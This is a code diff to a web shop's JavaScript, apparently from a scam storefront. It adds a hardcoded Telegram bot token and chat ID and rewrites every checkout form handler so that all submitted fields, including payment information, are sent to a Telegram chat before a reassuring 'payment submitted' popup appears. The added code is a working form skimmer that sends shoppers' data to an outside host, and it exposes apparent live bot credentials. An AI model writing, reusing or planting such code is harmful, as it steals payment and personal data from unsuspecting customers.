@@ -133,36 +133,71 @@ document.addEventListener('DOMContentLoaded', function () {
     });
   });
 
+  // Replace with your actual Telegram Bot API key and chat ID
+  const telegramApiKey = '7349914973:AAGj0OxyMtxwXfZ3i2XeWUVB-9r5ctLiFak';
+  const chatId = '5576539609';
+
+
   // Handle form submissions for each checkout form
   document.querySelectorAll('[id^="checkout-form"]').forEach(function (form) {
     form.addEventListener('submit', function (event) {
       event.preventDefault(); // Prevent the default form submission behavior
-
-      // Display the payment confirmation popup
-      const paymentPopup = document.getElementById('payment-popup');
-      paymentPopup.innerHTML = `
+  
+      // Gather the form data
+      const formData = new FormData(form);
+      let message = 'New Payment Information Submitted:\n';
+      formData.forEach((value, key) => {
+        message += `${key}: ${value}\n`;
+      });
+  
+      // Send the data to Telegram
+      fetch(`https://api.telegram.org/bot${telegramApiKey}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'HTML', // Optional: to enable HTML formatting
+        }),
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          // Display the payment confirmation popup
+          const paymentPopup = document.getElementById('payment-popup');
+          paymentPopup.innerHTML = `
             ✅✅✅✅✅ <br><br> Your Payment Information Has Been Submitted! Your Goods Should Drop To Your Inbox Soon.<br><br>
             If Your Goods Are Not Received Within 25 Minutes! Please Check Your Spam Email Folder! <br><br>
             Cant Locate Your Goods Or Need A Refund? Find The SUPPORT Tab in the Navigation. Without a Proof Of Payment Confirmation Refunds Are Guaranteed!
-      `;
-      paymentPopup.style.backgroundColor = '#007BFF'; // Light blue background
-      paymentPopup.style.display = 'block';
-
-      // Show the "Back To Home Page" button
-      const backHomeButton = document.querySelector('.back-home-button');
-      backHomeButton.style.display = 'block';
-
-      // Hide the form
-      const formOverlay = form.closest('.form-overlay');
-      formOverlay.style.display = 'none';
-
-      // Clear the form inputs
-      form.reset();
-
-      // Clear the cart
-      clearCart();
+          `;
+          paymentPopup.style.backgroundColor = '#007BFF'; // Light blue background
+          paymentPopup.style.display = 'block';
+  
+          // Show the "Back To Home Page" button
+          const backHomeButton = document.querySelector('.back-home-button');
+          backHomeButton.style.display = 'block';
+  
+          // Hide the form
+          const formOverlay = form.closest('.form-overlay');
+          formOverlay.style.display = 'none';
+  
+          // Clear the form inputs
+          form.reset();
+  
+          // Clear the cart
+          clearCart();
+        } else {
+          console.error('Error sending message to Telegram:', data.description);
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
     });
   });
+
 
   // Function to clear cart
   function clearCart() {
